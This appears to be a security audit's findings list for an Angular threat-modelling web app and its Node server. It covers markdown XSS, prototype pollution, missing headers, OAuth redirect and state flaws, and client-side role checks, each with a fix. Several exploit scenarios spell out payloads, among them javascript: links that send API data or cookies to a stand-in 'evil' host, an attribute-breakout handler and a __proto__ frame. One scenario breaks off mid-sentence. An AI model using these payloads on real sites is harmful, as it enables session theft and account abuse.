focus_areas: Markdown / Mermaid / SVG rendering XSS (markdown-providers.ts and consumers)
Frontend authorization / RBAC enforcement & JWT claim handling
Open redirect / unsafe navigation sinks (authorization_url, returnUrl)
Node/Express server.js — security headers, /config.json, /api reverse proxy
OAuth/SAML callback & state handling (PKCE, CSRF binding, fragment token flow)
Collaboration WebSocket adapter (proto pollution, imported diagram JSON) + logger
Cross-origin postMessage (file pickers), content-provider tokens, withCredentials scoping

findings.title: renderer.link concatenates raw markdown href into <a href> with no scheme check, Angular sanitizer disabled — javascript: URI stored XSS
findings.description: provideMarkdownConfig sets the Angular sanitizer to SecurityContext.NONE (line ~201: sanitize provide SANITIZE useValue SecurityContext.NONE), so ngx-markdown does NOT run Angular's DomSanitizer over rendered output. The only sanitization is whatever the custom MarkedRenderer methods do, and DOMPurify is applied ONLY inside renderer.html (raw-HTML blocks). The overridden renderer.link (lines ~58-77) builds the anchor with raw string concatenation: html = '<a href="' + href + '"' (line 67) where href = token.href comes straight from attacker markdown, with NO DOMPurify and NO scheme validation. The title attribute (line ~69) and heading id (line ~54) are likewise interpolated unescaped, enabling attribute breakout. marked 18 has no built-in javascript:-scheme URL filter, so the dangerous scheme survives. Data flow: persisted note/triage/chat content fetched from the backend (e.g. getNoteById in note-page.component.ts:178) is bound into <markdown [data]=...> across note-page, triage-note-editor-dialog, note-editor-dialog, and chat-messages, where marked produces a link token, renderer.link emits the unsanitized anchor, and it reaches the DOM with the Angular sanitizer disabled.
findings.exploit_scenario: An authenticated user who can author/persist a threat-model note writes markdown: [click me](javascript:fetch('/api/me').then(r=>r.text()).then(t=>fetch('https://evil/x?d='+encodeURIComponent(t)))). renderer.link emits click me with no scheme filtering and no DOMPurify; with the Angular sanitizer at NONE the href reaches the DOM intact. A victim viewing the note in their authenticated session (HttpOnly cookie) clicks it and the script runs in-origin, exfiltrating API data or acting as the user. A title-based variant [x](https://a "onmouseover=alert(1) x") breaks out of the title attribute via the unescaped quote to inject an event-handler attribute that fires without a click.
findings.recommendation: Do not disable the Angular sanitizer on a path that renders untrusted content. In renderer.link validate the href scheme against an allowlist (http/https/mailto/tel) and reject javascript:/data:/vbscript: (accounting for whitespace/control chars and case), then HTML-attribute-escape href, title, and the heading id before concatenation — or route the final anchor HTML through the same DOMPurify call used in renderer.html. Prefer constructing the element via DOM APIs/textContent. Restore SecurityContext.HTML or run DOMPurify over the entire rendered output, not just the html() token path.
findings.confidence_reason: Confirmed sanitizer=NONE plus raw href/title concatenation in renderer.link; ngx-markdown verified to skip sanitization at SecurityContext.NONE, marked 18 has no built-in URL scheme filter, and three live <markdown [data]> note consumers make javascript:-URI stored XSS reachable.

findings.title: Untrusted remote-cell update keys written via bracket assignment without __proto__/constructor guard
findings.description: A remote diagram_operation_event WS frame (untrusted server/peer) is parsed at websocket.adapter.ts:501 (JSON.parse -> TMIWebSocketMessage). _validateTMIMessage only checks that operation.type is a string and operation.cells is an array — it does not strip or reject extra keys inside a cell. The cell flows through AppRemoteOperationHandler._convertToCellNodeOperation (app-remote-operation-handler.service.ts:330-348) where the entire untrusted cell becomes properties: normalizedCell, then for an update op becomes updates.properties. In node-operation-executor.ts _applyNodeUpdates the code iterates Object.entries(updates.properties) and performs merged[k] = v (line ~504) with attacker-controlled key k on a plain object merged = {...currentData}. No __proto__/constructor/prototype filter exists anywhere in the src/app/pages/dfd tree (confirmed by grep). normalizeCellFormat uses {...cell} which preserves a __proto__ own-key produced by JSON.parse. When k === '__proto__' and v is an object, the bracket write invokes the __proto__ setter and reassigns merged's prototype. Impact is bounded: the reassignment is local to the merged object handed to X6 setData, not global Object.prototype pollution — object-shape corruption rather than app-wide gadget injection.
findings.exploit_scenario: A malicious collaboration peer (or a compromised/malicious WS server) sends a diagram_operation with cells=[{ id:'existingNodeId', shape:'process', '__proto__': { isAdmin: true } }]. The frame passes _validateTMIMessage (type + cells-array checks succeed), is converted to an update-node operation, and reaches merged['__proto__'] = {isAdmin:true}, reassigning the prototype of the object subsequently stored on the X6 cell. Downstream code reading cell data via property access could observe injected/inherited properties, corrupting node-data state for collaborators.
findings.recommendation: Before the merge loop, skip dangerous keys: if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;. Better, centralize a sanitizeUntrustedCell() that drops these keys (reuse the PROTOTYPE_POLLUTION_KEYS set from redact-sensitive-data.util.ts) and apply it in AppRemoteOperationHandler before cells are converted, covering every WS/import cell consumer. Build merged with Object.create(null) or set keys via Object.defineProperty.
findings.confidence_reason: Chain verified end-to-end (JSON.parse own-key __proto__ -> spread-preserved -> Object.entries -> bracket-assign setter at line 504, no guard anywhere in dfd tree); impact correctly bounded to local merged-object prototype reassignment, not global pollution, matching the stated MEDIUM severity.

findings.title: Static/SPA server sets no security response headers (no CSP, HSTS, X-Frame-Options, X-Content-Type-Options) — no server-side backstop for stored XSS or clickjacking
findings.description: The Express server in server.js emits no security headers on any response. There is no helmet, and the only header ever set is Cache-Control on /config.json (server.js:120). The SPA fallback that serves index.html (server.js:138-140 via res.sendFile), the static asset middleware (server.js:126-135), and the API proxy (server.js:28-35) all return responses with no Content-Security-Policy, Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, or Permissions-Policy. Two in-app mechanisms appear to address this but do not: (1) security-headers.interceptor.ts:14-16 early-returns in production and otherwise only logs missing headers — it never sets one; (2) SecurityConfigService.injectDynamicCSP() injects a CSP meta tag at runtime but deliberately drops frame-ancestors (security-config.service.ts:303, ignored in meta tags), and index.html (src/index.html:8) ships with only a CSP comment. Net: no clickjacking protection (no X-Frame-Options header, no frame-ancestors) and no server-set CSP backstop for the markdown stored-XSS sink (F-001); the meta-tag CSP also applies only after the JS bundle parses.
findings.exploit_scenario: Clickjacking: with no X-Frame-Options and no frame-ancestors, an attacker frames the app (
findings.recommendation: Set real security headers in server.js at the server tier, independent of the client app — add helmet (or an explicit middleware before the static/SPA handlers) emitting Content-Security-Policy with frame-ancestors 'none', X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy, Permissions-Policy, and (behind TLS) Strict-Transport-Security. Mirror the directive set computed in injectDynamicCSP() and move frame-ancestors/report-uri to the header. Treat the client interceptor and meta-tag injection as monitoring only.
findings.confidence_reason: Confirmed server.js sets zero security headers, the interceptor early-returns in production and otherwise only logs, index.html has only a CSP comment, and injectDynamicCSP deliberately drops frame-ancestors — so no clickjacking protection exists server-side; T5-scoped real issue, tempered slightly by the possibility a fronting CDN/proxy supplies headers in production.

findings.title: MS picker window-message handler validates origin strictly but does not verify evt.source
findings.description: _onWindowMessage (lines ~243-258) gates on evt.origin !== this.pickerOrigin (strict exact match against the server-minted provider_config.picker_origin set at line ~145) plus data.type === 'initialize' and data.id === channelId. The origin comparison is correct and strict (no substring/includes/startsWith weakness). The gap: the handler never checks evt.source === this.iframe?.contentWindow, so any frame served from the exact trusted pickerOrigin that knows the random channelId could deliver the initialize message and capture the MessageChannel port over which the access_token is later returned (line ~289). channelId is random (tmi-msft-${Date.now()}-${Math.random()...}) and the origin is a trusted Microsoft origin, so practical exploitability is very low — controlling content at the trusted MS origin is the dominant barrier.
findings.exploit_scenario: An attacker would need to (a) load content from the exact pickerOrigin (a Microsoft-controlled origin) into a frame able to postMessage to the SPA window, and (b) guess the random channelId, to inject a forged initialize and capture the port carrying the access token. Both preconditions make this impractical against the trusted SharePoint origin; it is a defense-in-depth gap, not a directly reachable exploit.
findings.recommendation: After the origin check, additionally verify evt.source === this.iframe?.contentWindow before calling _installPort, binding the handshake to the iframe the service itself mounted (standard postMessage hardening: origin + source).
findings.confidence_reason: Verified exactly as claimed — strict origin check present, evt.source unchecked before port install; real but low-severity defense-in-depth gap whose precondition (script at trusted MS origin + known channelId) makes it near-theoretical.

findings.title: withCredentials scoped to apiUrl via prefix startsWith, not exact-origin match
findings.description: CredentialsInterceptor.isApiRequest (lines ~28-30) and JwtInterceptor.isApiRequest (jwt.interceptor.ts:96-98) gate on url.startsWith(environment.apiUrl). For environments where apiUrl includes a path segment (e.g. https://api.example.com/v1), a prefix match means a URL like https://api.example.com/v1.attacker.example or .../v1@attacker would also satisfy startsWith and receive withCredentials: true (HttpOnly cookie auto-attached). However, all HttpClient request URLs are constructed by ApiService.buildUrl as apiUrl + '/' + a normalized fixed-fragment endpoint, so no request URL's host is attacker-influenced today; the credentialed cookie cannot leak cross-origin under any current code path. This is a robustness/hardening nuance, not a currently reachable vulnerability.
findings.exploit_scenario: If a future code path ever let an attacker influence the host/path of an HttpClient request URL (e.g. a server-supplied absolute URL passed to http.get), an origin sharing the apiUrl string as a prefix would pass the startsWith gate and the HttpOnly session cookie would be sent cross-origin. No such injection point exists today.
findings.recommendation: Parse the request URL and compare its origin exactly: new URL(url).origin === new URL(environment.apiUrl).origin, rather than startsWith on the full apiUrl string, so a host that merely shares the apiUrl as a string prefix cannot match.
findings.confidence_reason: startsWith(apiUrl) gating confirmed; all request URLs are buildUrl-constructed as apiUrl + '/' + fixed-fragment endpoint, so no attacker-controlled host can satisfy the prefix today — real but currently non-exploitable hardening nuance, correctly rated LOW.

findings.title: Unvalidated backend authorization_url assigned to window.location.href (no scheme/origin allowlist)
findings.description: In onConnect(), this.tokenService.authorize(providerId, returnTo) returns a ContentAuthorizationURL whose authorization_url field (a raw backend string; content-token.service.ts:63-78, api-types.d.ts:10295) is assigned directly to window.location.href at line 276. There is no scheme allowlist (http/https) and no origin/host allowlist before navigation, and no javascript:/data: block. The in-scope trust boundary is backend-response -> browser navigation (T9): if the authorize endpoint (POST /me/content_tokens/{provider}/authorize) can be induced to return an attacker-controlled value — via a compromised/misconfigured OAuth-provider config, a malicious provider registration, or response injection — the value is followed without validation. A javascript:/data: scheme would execute in-origin (XSS); an https://evil value is an open redirect for phishing from a trusted page.
findings.exploit_scenario: An attacker who can influence the authorize endpoint's response returns authorization_url: "javascript:fetch('https://evil/x?c='+document.cookie)" or "https://evil.example/oauth?...". The victim clicks Connect on a content provider; line 276 navigates the top frame to the attacker URL. The javascript: variant runs script in the app origin; the https variant is a credential-phishing redirect from a trusted page.
findings.recommendation: Before assignment, parse with new URL(res.authorization_url) and require url.protocol === 'https:' (reject javascript:/data:/http:); additionally enforce a per-provider allowlist of expected OAuth-provider hostnames (accounts.google.com, login.microsoftonline.com, auth.atlassian.com). Reject and log on mismatch. Factor into a shared navigateToProviderAuthUrl(url) helper used by all three call sites.
findings.confidence_reason: Sink verified exactly as claimed — backend string assigned to window.location.href with zero scheme/origin validation; in-scope per T9; exploitability is backend-contingent (no client-controlled path to the value), which caps confidence below high.

findings.title: Unvalidated backend authorization_url assigned to window.location.href in remediation card
findings.description: In handle() for the link_account/relink_account remediation actions, this.contentTokens.authorize(providerId, this.router.url) resolves to a backend authorization_url assigned directly to window.location.href at line 109 with no scheme/origin validation — the third instance of the same pattern (F-006, F-008). The providerId comes from rem.params?.['provider_id'] (remediation data, line ~105), and authorization_url from the backend authorize response. No javascript:/data: block; a hostile value becomes in-origin script execution.
findings.exploit_scenario: A remediation card rendered in the access-diagnostics panel is clicked; if the authorize endpoint can be induced to return an attacker-controlled authorization_url, line 109 navigates the top frame to that value — javascript: for XSS in the app origin, or an external origin for credential phishing from a trusted security-diagnostics surface.
findings.recommendation: Same fix as F-006: https-only scheme validation plus per-provider host allowlist before the window.location.href assignment; share one validated navigation helper across all three sites.
findings.confidence_reason: Verified unvalidated backend authorization_url assigned to window.location.href at line 109 with no scheme block; real open-redirect/javascript-URI sink but backend-contingent, so MEDIUM is appropriate.

findings.title: OAuth state/CSRF validation is skipped entirely when the callback omits the state parameter
findings.description: handleOAuthCallback validates the CSRF state only inside if (response.state) (line ~830). When state is absent, control falls into the else branch (lines ~868-875) which performs no CSRF check and proceeds straight to token handling / exchangeAuthorizationCode (line ~887). The bound CSPRNG value in localStorage is only consulted inside the if (response.state) arm; the pipeline never enforces that a stored oauth_state exists. The callback component (auth-callback.component.ts) requires only code (line ~72) or a fragment access_token with optional state, so an attacker who omits state controls whether the defense runs — a make-the-defense-optional flaw. IMPORTANT mitigating fact found in scoring: for the primary code path, exchangeAuthorizationCode requires a PKCE verifier from sessionStorage (throws if absent) and PKCE binds the code to the verifier server-side, so PKCE independently blocks auth-code injection on that path. The genuinely unguarded spot is the fragment access_token path (handleTMITokenResponse called directly, no verifier requirement). Severity is therefore the missing-CSRF-control defense-in-depth flaw; the headline login-CSRF impact is partly mitigated by PKCE.
findings.exploit_scenario: Attacker delivers the victim a callback with only code and no state to /oauth2/callback; line 830 is false, CSRF validation is skipped, and the flow proceeds to code exchange. On the code path PKCE verifier binding still protects against injecting the attacker's code; on the legacy fragment access_token path (no verifier check) a token-bearing callback with no state is accepted with no CSRF/binding check, enabling login-CSRF / auth-state confusion (impact bounded by the HttpOnly-cookie design — see F-011).
findings.recommendation: Make state validation mandatory, not conditional. For any code/token-bearing callback, require that localStorage oauth_state exists, that response.state is present, and that its decoded csrf matches; reject otherwise. Remove the else branch that proceeds without validation, and treat 'no stored state' and 'no received state' as hard failures.
findings.confidence_reason: Conditional if (response.state) genuinely makes CSRF state validation skippable and the callback accepts a missing state, so the defense-optional flaw is real; but PKCE verifier enforcement in exchangeAuthorizationCode independently blocks auth-code injection on the main code path, making the HIGH login-CSRF impact partially overstated (the unguarded access_token fragment path is the truly weak spot).

findings.title: Untrusted OAuth state deserialized via JSON.parse(atob(state)) with no shape validation; non-string returnUrl triggers an unhandled exception
findings.description: decodeState (lines ~772-792) performs JSON.parse(atob(state)) on attacker-controlled state (line 776) and casts to {csrf, returnUrl} with no runtime shape validation; the local try/catch wraps only the decode, not later use. isValidReturnUrl (lines ~800-804) calls url.startsWith('/'); a non-string returnUrl (e.g. base64 of {"returnUrl":123}) throws a TypeError. Because the throw at the navigation site occurs inside an RxJS switchMap callback executing asynchronously after the outer synchronous try has returned, it surfaces as an unhandled observable error rather than being caught. Open redirect itself is mitigated — returnUrl is re-validated by isValidReturnUrl at the navigation sinks before any navigation. Impact is robustness / self-inflicted DoS-of-own-login (an attacker crafting their own malformed state breaks only their own callback); no RCE, no redirect, no cross-user impact.
findings.exploit_scenario: Attacker supplies state = base64({"csrf":"<matching>","returnUrl":123}). decodeState returns returnUrl=123; the navigation guard calls (123).startsWith -> TypeError thrown in the async switchMap, breaking the post-auth flow. Limited to the attacker's own login attempt.
findings.recommendation: Validate the decoded object shape explicitly: confirm typeof decoded.csrf === 'string' and (decoded.returnUrl === undefined || typeof decoded.returnUrl === 'string') before use; reject otherwise. Harden isValidReturnUrl to check typeof url === 'string' at entry. Do not trust the TS cast for security decisions on attacker-controlled JSON.
findings.confidence_reason: Verified real — JSON.parse with no shape validation and isValidReturnUrl throws on non-string returnUrl; but impact is only a self-inflicted exception in the login path (no RCE, redirect validated), correctly rated LOW.

findings.title: Unvalidated backend authorization_url assigned to window.location.href in document editor link flow
findings.description: In onLinkSource(), this.contentTokens.authorize(providerId, returnTo) resolves to a backend response whose authorization_url is assigned to window.location.href at line 560 with no scheme or origin validation — identical sink to F-006/F-007. The returnTo argument here is window.location.pathname + window.location.search (line ~554), so the round-trip return target is partly attacker-influenceable via the current URL, but the in-scope corruption is the inbound authorization_url. No javascript:/data: scheme block exists, so a hostile value executes as XSS rather than a mere redirect.
findings.exploit_scenario: If the authorize endpoint returns an attacker-controlled authorization_url, a user opening the document-editor dialog and choosing link account is navigated (line 560) to javascript:... (in-origin script execution, can exfiltrate via authenticated same-origin requests since the session cookie is HttpOnly) or to an external phishing origin.
findings.recommendation: Apply the same fix as F-006: validate res.authorization_url against an https-only scheme check and a per-provider host allowlist before assigning to window.location.href. Factor into a shared navigateToProviderAuthUrl(url) helper used by all three call sites.
findings.confidence_reason: Sink verified exactly as claimed (backend authorization_url -> window.location.href, no validation), open-redirect in scope per T9; capped because the source is a trusted same-origin backend OAuth response, making real exploitability contingent on backend compromise/SSRF rather than direct attacker control.

findings.title: 'everyone' pseudo-group grants any authenticated user the entry's role client-side, including writer/owner
findings.description: In _matchAuthorizationEntry (lines ~354-362), a group authorization entry whose provider_id lowercases to 'everyone' returns auth.role for ANY authenticated user, with no group-membership check, and the role is NOT capped to reader — so reader, writer, or owner can be granted. This feeds _findHighestPermission -> calculateUserPermission -> canEdit$/canManagePermissions$, which gate edit and permission-management UI across ~71 call sites (e.g. tm-edit.component.ts). The authorization list is data returned from the backend for a threat model; any user who can read a TM with an 'everyone' entry carrying writer/owner is granted that role client-side. Whether this is a real privilege escalation is contingent on the out-of-repo Go backend: if the backend enforces the same 'everyone'-broad semantics this is intended; if the backend's handling is narrower or absent, the client over-grants UI (which issues real PUT/POST/DELETE mutations). The client notably does not restrict the everyone role to reader, the usual safe convention.
findings.exploit_scenario: A TM owner adds an 'everyone' group ACL intending read-only sharing but selects role writer (the permissions dialog permits it). Every authenticated user who opens the TM now sees full edit controls and can mutate threats/diagrams. A user able to craft/replay an authorization payload with an everyone+owner entry would, client-side, be elevated to owner and shown permission-management UI.
findings.recommendation: Cap the 'everyone' pseudo-group to at most reader on the client (return auth.role === 'reader' ? 'reader' : null), and disallow assigning writer/owner to 'everyone' in the permissions dialog. Confirm the Go backend enforces the same cap server-side — the client cap is only UX hardening.
findings.confidence_reason: Code claim is exactly correct (uncapped everyone-role, no membership check, flows to canEdit/canManagePermissions), but it's a client-side UX gate only — real privilege escalation hinges on the out-of-repo Go backend being non-authoritative, which tempers it to mid-range.

findings.title: Inbound WS JSON.parse output cast to typed message with open-schema validation; extra attacker keys pass through to handlers
findings.description: At websocket.adapter.ts:501 (TMI handler) and ~688 (internal handler) raw frames are JSON.parsed and cast to TMIWebSocketMessage/WebSocketMessage. _validateTMIMessage / _validateWebSocketMessage validate only that required fields exist with the right primitive type — they do not enforce a closed schema, so any additional attacker-chosen properties on the parsed object survive and are emitted via _tmiMessages$.next(message) to all downstream subscribers and the message bus. Combined with shape-trusting consumers (e.g. F-002's property loop, or code that spreads the cell into X6 config), this is the deserialization entry point that lets unexpected fields (including proto keys) reach object writes. On its own it is over-trusting deserialization / logic-abuse with no independent demonstrated sink beyond F-002, hence LOW.
findings.exploit_scenario: A malicious peer adds fields the validators never check (a forged initiating_user/update_vector, or proto/constructor keys nested in operation.cells[*]). The validator returns isValid:true, the message is broadcast to subscribers, and shape-trusting consumers act on the injected fields — e.g. the cell property loop in F-002, or presenter/permission logic reading attacker-supplied user fields.
findings.recommendation: Validate against a closed schema: reject messages whose cells/objects contain keys outside an allowlist (reuse CELL_ALLOWED_FIELDS/NODE_ALLOWED_FIELDS from cell-property-filter.util.ts), and run inbound cells through sanitizeCellForApi-style allowlist filtering BEFORE handing them to remote-operation handlers, not only on the outbound API path.
findings.confidence_reason: Open-schema validation confirmed (extra keys pass through to _tmiMessages$ subscribers), but with no independent demonstrated sink beyond F-002 this is largely a defense-in-depth restatement of the same data flow's entry point — correctly LOW.

findings.title: Query-param return_to navigated via navigateByUrl with no isValidReturnUrl check
findings.description: In ngOnInit(), returnTo is read directly from the return_to query parameter (line ~36: params['return_to'] ?? '/dashboard') and passed to this.router.navigateByUrl(returnTo) at line 64 with NO validation — unlike the auth.service.ts paths, which gate every navigateByUrl/location.href behind isValidReturnUrl (rejects // and requires a leading /). An attacker fully controls return_to via a crafted link. Angular's navigateByUrl interprets its argument as an in-app router URL, not a browser navigation, so it does NOT navigate off-origin to https://evil.com (that becomes a failed route lookup) and a protocol-relative //evil.com is parsed as an in-app path segment — so a true external open redirect does not occur. The genuine defect is the validation inconsistency and a defense-in-depth gap allowing arbitrary internal-route navigation (including routes that render attacker-influenced state), not a demonstrable off-origin redirect.
findings.exploit_scenario: Attacker sends a victim a link to the content-callback route with return_to set to an attacker-chosen value. After the callback handling, line 64 navigates using the unvalidated string with no allowlist, manipulating in-app navigation on a page reached mid-OAuth; a true external redirect is blunted by Angular's router parsing.
findings.recommendation: Route returnTo through the same isValidReturnUrl() (or an equivalent shared validator) used in auth.service.ts before calling navigateByUrl; fall back to /dashboard on failure. Centralize so all return-URL navigations share one validator.
findings.confidence_reason: Ungated attacker-controlled return_to -> navigateByUrl is real and inconsistent with isValidReturnUrl used everywhere in auth.service.ts, but Angular's router parses the arg as an in-app route so //evil.com does not produce a true external open redirect — defense-in-depth/consistency gap, not an exploitable off-origin redirect, so MEDIUM is slightly overstated.

findings.title: Angular sanitizer disabled (SecurityContext.NONE) leaves markdown-native renderer paths without a framework backstop
findings.description: Line ~201 disables ngx-markdown's Angular sanitization for every <markdown> consumer (note pages, triage note editor, note editor dialog, chat). The custom renderer applies DOMPurify ONLY inside renderer.html (raw HTML blocks); markdown-native constructs rendered via other renderer methods (images, autolinks, link, heading) reach the DOM with no DOMPurify and no Angular sanitizer. Scoring showed marked 18's default image renderer encodeURI's the src and escapes alt/title, so the image/autolink paths are largely neutralized by marked's own defaults — the one concrete unsanitized injection point is the custom renderer.link, which is exactly F-001. This finding's independent value is the architectural 'no framework backstop' / defense-in-depth observation: disabling the sanitizer means a future marked change or an un-overridden renderer method silently becomes an XSS sink with no fallback.
findings.exploit_scenario: Even where marked escapes a given field today, the disabled sanitizer means any future renderer change or un-overridden method (e.g. a custom image renderer added later) becomes an XSS sink with no framework backstop. The concrete exploit today is the renderer.link path (F-001); this entry captures the systemic root cause.
findings.recommendation: Re-enable Angular sanitization (SecurityContext.HTML) for these components, OR wrap the complete marked output through DOMPurify (not only the html() token) with the strict ALLOWED_TAGS/ALLOWED_ATTR set, so every renderer path passes through one sanitizer. Override and sanitize renderer.image as well. Treat 'sanitizer disabled' as requiring a provably exhaustive renderer, which it is not here.
findings.confidence_reason: Root cause (SecurityContext.NONE, DOMPurify only on renderer.html) is verified, but marked 18's default image/autolink renderers escape alt/title and encodeURI the src, so the only concrete unsanitized sink is the custom renderer.link = F-001; this is largely a defense-in-depth/root-cause restatement rather than a distinct exploitable sink.

findings.title: DOMPurify in renderer.html uses permissive ALLOWED_URI_REGEXP and allows style/svg, weakening the only sanitized path
findings.description: The renderer.html DOMPurify config (lines ~83-162) is the one sanitized path, but it is configured permissively: ALLOWED_URI_REGEXP (lines ~159-160) permits data: URIs, and ALLOWED_ATTR includes style (line ~145) while ALLOWED_TAGS includes svg/path/g (lines ~116-125). Since the Angular sanitizer is disabled (line 201), this DOMPurify config is the sole sanitization layer for raw-HTML blocks in persisted note content. Scoring assessment: the allowed SVG subset is presentational only (no use/foreignObject/animate/script), DOMPurify still strips event handlers and <script> and applies its built-in mXSS/SVG defenses, and style enables CSS-based exfil/aesthetics but not script execution in modern browsers. So this is a legitimate hardening concern with no demonstrated script-execution path — likely to survive triage only as low-severity defense-in-depth.
findings.exploit_scenario: Authenticated attacker embeds a raw HTML block in a note containing permitted SVG/style markup or a data: href, relying on browser mutation-XSS quirks to escalate the surviving markup when a victim renders the note. No concrete script-execution payload is demonstrated; the style attribute enables CSS injection for exfiltration/UI-redress within the authenticated session.
findings.recommendation: Tighten ALLOWED_URI_REGEXP to an explicit http/https/mailto/tel allowlist and drop data:. Remove style from ALLOWED_ATTR unless strictly required, and constrain SVG to the minimal tag/attribute set actually needed (or render diagrams only through the trusted Mermaid path, not attacker-supplied raw SVG). Keep DOMPurify's default URI policy rather than overriding it broadly.
findings.confidence_reason: Config claims are accurate (data: allowed, style/svg/path/g in allowlists, Angular sanitizer disabled so DOMPurify is the sole gate), but the allowed SVG subset is presentational with no script-capable tags and no event handlers, so DOMPurify's built-in mXSS/SVG defenses cover the named vectors — a legitimate hardening finding with no demonstrated script-execution path.

findings.title: Email-fallback owner match can grant 'owner' on email collision (same provider)
findings.description: _checkOwnerMatch (lines ~252-294) first compares (provider, provider_id), but adds an email fallback (lines ~256-260): if provider_id does not match, the user is still treated as owner when this._currentOwner.provider_id === currentUserEmail (the actual comparison is against the owner's provider_id field, which the in-code comment documents as a backend-bug workaround where the backend stored an email in provider_id). providerMatches is still required (line ~262), so this is SAME-provider only, not cross-provider as the original title suggested. A same-provider user whose provider_id differs but whose value collides with the owner's email-in-provider_id is granted owner and shown permission-management UI. Backend-contingent: real escalation only if the server's owner check is also loose/email-based AND email uniqueness/verification isn't enforced server-side. Narrow precondition.
findings.exploit_scenario: A victim owner record has provider_id literally equal to an attacker's email value (same provider); the attacker account opens the TM, the email fallback marks them owner client-side, exposing manage-permissions/delete controls that issue real backend permission-change requests — succeeding only if the backend's owner check is equally loose.
findings.recommendation: Remove the email fallback or gate it behind a server-verified-email flag; rely on (provider, provider_id) only. Fix the underlying backend bug it compensates for. Never treat email equality as identity for an owner-level privilege decision.
findings.confidence_reason: Email fallback exists and grants owner without a provider_id match, but it's same-provider only (not cross-provider as originally titled), client-side UI exposure only, explicitly a documented backend-bug workaround, and gated on a narrow precondition (owner.provider_id literally equals attacker email) plus a non-enforcing backend.

findings.title: Cached is_admin/is_security_reviewer keeps deauthorized users privileged in already-loaded views until a guard re-fetch
findings.description: isAdmin/isSecurityReviewer (lines ~205-211) read from the in-memory userProfileSubject, refreshed only on login, page refresh, and route activation (adminGuard/reviewerGuard call refreshUserProfile() / GET /users/me per navigation). In-page admin action handlers gate on the cached getter (e.g. admin-settings, admin-quotas, admin-users components). Stale-role window: an admin deauthorized server-side keeps is_admin === true in the loaded SPA until the next GET /me (navigation or refresh); any admin action triggered from an already-open admin page passes the client check. Harmless if the server re-authorizes the underlying admin API calls (the code catches 401/403 silently, implying the server does enforce). A bounded stale-trust-window defense-in-depth observation.
findings.exploit_scenario: An admin's privileges are revoked while they have the /admin page open. Until they navigate (triggering the guard's refreshUserProfile) or refresh, the cached isAdmin stays true and admin buttons remain active; clicking them issues admin API calls that succeed only if the server hasn't also revoked. Window bounded by session/refresh cadence.
findings.recommendation: For sensitive in-page admin actions, re-validate via a fresh GET /me (or rely on server 401/403 and surface it) rather than the cached getter; keep route guards as-is. Primary mitigation is server-side per-request authorization, which appears present.
findings.confidence_reason: Accurately confirmed (cached getters + per-navigation /me re-fetch guards), but it's a textbook low-severity defense-in-depth stale-client-role window, fully backend-contingent and bounded by navigation/refresh cadence.

findings.title: Legacy URL-fragment flow accepts a raw access_token from an attacker-controlled callback URL (impact neutered by HttpOnly-cookie design)
findings.description: The fragment handler (lines ~79-101) parses the URL fragment and, if params.access_token is present, calls handleOAuthCallback with that raw token (lines ~91-97). The fragment is entirely client/attacker-controlled, and the only state carried is params.state which an attacker may omit (skipping CSRF per F-008). Scoring confirmed the body access_token is structurally DEAD: handleTMITokenResponse (auth.service.ts ~914-921) comments that with HttpOnly cookies the server sets tokens as cookies and the client only extracts expires_in; the token bytes are read at ~882 merely as a branch-selector then discarded, storeSessionInfo stores only {expiresIn, expiresAt}, and refreshUserProfile calls GET /me with cookies. So injecting a fragment access_token cannot authenticate the victim as the attacker (no attacker cookies in the victim's browser; body token never sent anywhere). The realistic outcome is client-side auth-state confusion / login-CSRF nuisance overlapping F-008, not token injection or account takeover.
findings.exploit_scenario: Attacker sends victim https://app/oauth2/callback#access_token=foo&expires_in=3600 (no state). The fragment handler accepts it, CSRF is skipped, and the app flips to an 'authenticated' UI state and navigates, then calls GET /me using the victim's existing cookies (or 401). No real session change occurs; the impact is UI-state confusion / login-CSRF, not credential injection.
findings.recommendation: Remove the legacy fragment access_token branch entirely for the PKCE/cookie architecture, or gate it behind mandatory state validation identical to the code path. Never accept access_token/refresh_token from a URL fragment as proof of authentication.
findings.confidence_reason: Fragment access_token is accepted but never used as a credential (cookie-only design; body token is a dead branch-selector, /me uses cookies), so the HIGH token-injection impact is unrealizable — only low-severity login-CSRF/client-state confusion remains, overlapping F-008.

findings.title: /api reverse proxy forwards arbitrary unauthenticated paths to the backend when enabled (no user-controlled target — not classic SSRF)
findings.description: The /api/* reverse proxy (server.js:16-36, 153-155) is gated behind TMI_ENABLE_API_PROXY === 'true' (line 16) and a fixed operator-env TMI_PROXY_TARGET (line 17, refuses to start if unset). createProxyMiddleware uses a static target with no dynamic/router target and no host-header-based selection, so a remote attacker cannot redirect the proxy to an arbitrary host — this is NOT classic SSRF/open-relay. Residual: when enabled, the proxy strips the /api prefix (pathRewrite, line ~32) and forwards any /api/<anything> path — including WebSocket upgrades (ws: true; upgrade handler 153-155) — from unauthenticated clients to the backend with changeOrigin: true, so the backend sees apparently same-origin traffic. If the backend trusts 'internal'/same-origin callers or the rewritten path can reach backend-internal routes, the proxy becomes a reachability bridge. Entirely backend-trust-contingent; proxy off by default.
findings.exploit_scenario: With the proxy enabled, an unauthenticated user sends GET /api/internal/admin/...; the middleware rewrites it to /internal/admin/... and forwards it to TMI_PROXY_TARGET with changeOrigin, so the backend sees a request that appears same-origin. If the backend gates any route on origin/network position rather than a verified token, the proxy lets an external user reach it. No attacker control over the destination host, so not full SSRF.
findings.recommendation: Confirm the backend enforces auth on every route independently (do not rely on the proxy or changeOrigin for trust). Restrict the proxied path prefix to the intended public API surface and reject unexpected sub-paths at the proxy. Document that enabling TMI_ENABLE_API_PROXY exposes the backend to unauthenticated same-origin-looking traffic.
findings.confidence_reason: Code confirms operator-env-only fixed target, opt-in and off by default with no user-controlled destination, so not real SSRF; residual is purely backend-trust-contingent.

findings.title: Loose isBase64 heuristic and non-constant-time csrf comparison in decodeState (claimed undefined===undefined bypass not reachable)
